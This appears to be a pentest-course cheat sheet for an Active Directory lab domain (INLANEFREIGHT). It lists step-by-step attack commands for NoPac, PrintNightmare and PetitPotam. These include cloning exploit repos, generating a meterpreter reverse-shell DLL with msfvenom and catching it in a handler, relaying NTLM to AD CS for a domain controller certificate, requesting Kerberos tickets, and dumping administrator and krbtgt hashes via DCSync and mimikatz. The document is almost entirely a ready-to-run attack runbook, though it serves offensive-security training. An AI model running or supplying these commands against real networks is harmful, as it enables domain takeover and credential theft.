## **NoPac (SamAccountName Spoofing)**
1. Cloning the NoPac Exploit Repo: `git clone https://github.com/Ridter/noPac.git`
2. Check if the system is vulnerable using a scanner: `sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap`
3. Running NoPac & Getting a Shell: ` sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap`
4. Using noPac to DCSync the Built-in Administrator Account: `sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator`
## **PrintNightmare**
1. Cloning the Exploit: `git clone https://github.com/cube0x0/CVE-2021-1675.git`
2. Install cube0x0's Version of Impacket:
    1. `pip3 uninstall impacket`
    2. `git clone https://github.com/cube0x0/impacket`
    3. `cd impacket`
    5. `python3 ./setup.py install`
3. Enumerating for MS-RPRN: `rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'`
4. Generating a DLL Payload: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll`
5. Creating a Share with smbserver.py: `sudo smbserver.py -smb2support CompData /path/to/backupscript.dll`
6. Configuring & Starting MSF multi/handler:
    1. `use exploit/multi/handler`
    2. `set PAYLOAD windows/x64/meterpreter/reverse_tcp`
    3. `set LHOST 172.16.5.225`
    4. `set LPORT 8080`
    5. `run`
7. Running the Exploit: `sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'`
## **PetitPotam (MS-EFSRPC)**
1. Starting ntlmrelayx.py: `sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController`
2. Running PetitPotam.py: `python3 PetitPotam.py 172.16.5.225 172.16.5.5  `
3. Catching Base64 Encoded Certificate for DC01: `sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController`
4. Requesting a TGT Using gettgtpkinit.py: `python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache`
5. Setting the KRB5CCNAME Environment Variable: `export KRB5CCNAME=dc01.ccache`
6. Using Domain Controller TGT to DCSync: `secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL`
7. Confirming Admin Access to the Domain Controller: `crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf`
**Submitting a TGS Request for Ourselves Using getnthash.py is an alternate route once we have the TGT for our target (step 4)**
5. Using the tool getnthash.py from PKINITtools we could request the NT hash for our target host/user by using Kerberos U2U to submit a TGS request with the Privileged Attribute Certificate (PAC) which contains the NT hash for the target.: `python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$`
6. Using Domain Controller NTLM Hash to DCSync: `secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba`
**Alternatively, once we obtain the base64 certificate via ntlmrelayx.py, we could use the certificate with the Rubeus tool on a Windows attack host to request a TGT ticket and perform a pass-the-ticket (PTT) attack all at once.**
4. Requesting TGT and Performing PTT with DC01$ Machine Account: `.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt`
5. Confirming the Ticket is in Memory: `klist`
6. Performing DCSync with Mimikatz:
    1. `.\mimikatz.exe`
    2. `mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt`